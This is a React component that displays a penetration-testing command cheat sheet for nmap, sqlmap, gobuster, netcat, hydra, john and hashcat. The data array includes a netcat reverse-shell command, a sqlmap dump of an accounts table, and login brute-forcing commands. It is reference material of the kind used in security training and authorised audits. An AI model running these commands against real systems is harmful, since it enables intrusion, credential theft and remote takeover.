/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from "react";
import { Terminal, Shield, Clipboard, Check } from "lucide-react";

interface CommandEntry {
  cmd: string;
  desc: string;
}

interface ToolGroup {
  name: string;
  description: string;
  commands: CommandEntry[];
}

const CHEATSHEET_DATA: ToolGroup[] = [
  {
    name: "Nmap (Network Port Scanner)",
    description: "An industry-standard utility used for network discovery, port auditing, and vulnerability checking.",
    commands: [
      { cmd: "nmap -sS -p- 10.10.10.100", desc: "Performs an anonymous TCP SYN stealth scan against all 65,535 listening ports." },
      { cmd: "nmap -sV -sC -O -oN report.txt 10.10.10.100", desc: "Runs standard vulnerability scripts, detects services, fingerprints OS, and saves outputs to a file." },
      { cmd: "nmap -p 80,443 --script vuln 10.10.10.100", desc: "Applies all of Nmap's vulnerability auditing scripts against target HTTP web paths." }
    ]
  },
  {
    name: "SQLmap (SQL Injection Exploit Tool)",
    description: "Automates SQL injection discovery and database exploitation.",
    commands: [
      { cmd: "sqlmap -u \"http://site.com/api?id=5\" --dbs", desc: "Audit the specified GET parameter to see if it's vulnerable and list database schemas." },
      { cmd: "sqlmap -u \"http://site.com/api?id=5\" -D test_db --tables", desc: "Lists all directories and tables within 'test_db'." },
      { cmd: "sqlmap -u \"http://site.com/api?id=5\" -D test_db -T accounts --dump", desc: "Dumps rows from the accounts database table, revealing plaintext passwords or hashes." }
    ]
  },
  {
    name: "Gobuster & Dirb (Web Path Discovery)",
    description: "Forces directories, subdomains, and file paths using standard wordlists to map server files.",
    commands: [
      { cmd: "gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt", desc: "Brute-force audits a web server root path to discover hidden index directories." },
      { cmd: "gobuster dns -d target.com -w subdomains.txt", desc: "Performs DNS querying to harvest valid subdomains." }
    ]
  },
  {
    name: "Netcat & Socat (The Swiss Army Knife)",
    description: "Utility used to read, write, listen, and pipe data streams across network ports.",
    commands: [
      { cmd: "nc -lvnp 4444", desc: "Opens a local listener on TCP Port 4444 to catch a reverse shell connection." },
      { cmd: "nc -vz 10.10.10.100 20-100", desc: "Runs a quick, light scan over port range 20 to 100 on the target IP." },
      { cmd: "nc 10.10.10.100 4444 -e /bin/bash", desc: "Launches a standard Linux reverse shell connection to an attacker listener." }
    ]
  },
  {
    name: "Hydra & Medusa (Brute Force Logins)",
    description: "A fast, network login brute-forcing tool supporting SSH, FTP, RDP, SMB, and HTTP forms.",
    commands: [
      { cmd: "hydra -l admin -P wordlist.txt 10.10.10.100 ssh", desc: "Tests logins against SSH server on the target IP using username 'admin'." },
      { cmd: "hydra -L users.txt -P passwords.txt 10.10.10.100 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Login Failed\"", desc: "Brute-forces credentials against a web POST login form." }
    ]
  },
  {
    name: "John the Ripper & Hashcat (Password Cracking)",
    description: "Offline cryptographic hash cracker used by audit teams to verify password strengths.",
    commands: [
      { cmd: "john --wordlist=rockyou.txt hashes.txt", desc: "Cracks local hashes contained in a file using the famous RockYou dictionary." },
      { cmd: "hashcat -m 1800 hashes.txt rockyou.txt", desc: "Runs GPU-accelerated hash cracking against SHA-512 crypt hashes." }
    ]
  }
];

export default function TerminalCheatsheet() {
  const [copiedText, setCopiedText] = useState<string | null>(null);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="max-w-4xl mx-auto py-8 px-4 text-zinc-300">
      <div className="flex items-center gap-3 mb-6">
        <div className="bg-green-500/10 border border-green-500/30 p-2 rounded-lg">
          <Terminal className="w-6 h-6 text-green-500" />
        </div>
        <div>
          <h1 className="text-xl font-mono font-bold text-white">CLI Tool Kit & Hacker Handbook</h1>
          <p className="text-xs text-zinc-500">Fast-reference syntax database of common commands utilized in audits.</p>
        </div>
      </div>

      <div className="space-y-6">
        {CHEATSHEET_DATA.map((group, gIdx) => (
          <div key={gIdx} className="bg-zinc-900 border border-zinc-800/80 rounded-xl overflow-hidden shadow-lg">
            <div className="bg-zinc-950 px-5 py-3 border-b border-zinc-800 flex items-center justify-between">
              <div>
                <h3 className="text-sm font-mono font-bold text-green-400">{group.name}</h3>
                <p className="text-[11px] text-zinc-500 font-sans mt-0.5">{group.description}</p>
              </div>
              <Shield className="w-4 h-4 text-zinc-600" />
            </div>

            <div className="p-4 space-y-4">
              {group.commands.map((c, cIdx) => (
                <div key={cIdx} className="bg-zinc-950/80 border border-zinc-800/50 rounded-lg p-3 w-full min-w-0">
                  <div className="flex justify-between items-start gap-4 w-full min-w-0">
                    <div className="overflow-x-auto w-full pr-2 scrollbar-thin scrollbar-thumb-zinc-800 min-w-0">
                      <code className="text-xs font-mono text-green-300 select-all whitespace-pre-wrap break-all block py-0.5">{c.cmd}</code>
                    </div>
                    <button
                      onClick={() => copyToClipboard(c.cmd)}
                      className="text-zinc-500 hover:text-white bg-zinc-900/60 p-1.5 rounded border border-zinc-800 hover:border-zinc-700 transition shrink-0"
                      title="Copy Command"
                    >
                      {copiedText === c.cmd ? (
                        <Check className="w-3.5 h-3.5 text-green-400" />
                      ) : (
                        <Clipboard className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                  <p className="text-[11px] text-zinc-400 font-sans mt-1.5 border-t border-zinc-900 pt-1.5">
                    {c.desc}
                  </p>
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
